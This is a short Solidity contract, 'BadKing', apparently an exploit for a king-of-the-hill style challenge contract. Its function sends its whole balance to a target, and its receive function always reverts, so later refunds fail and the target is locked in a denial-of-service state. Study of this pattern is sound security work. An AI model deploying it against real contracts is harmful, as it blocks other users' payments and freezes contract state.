/**
 *Submitted for verification at Etherscan.io on 2021-12-31
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BadKing {

  constructor() payable { }

  receive() external payable {
    revert();
  }

  function transfer(address payable target) public payable {
    target.call{value: address(this).balance, gas: 4000000}("");
  }

  function viewBalance() public view returns (uint) {
      return address(this).balance;
  }
}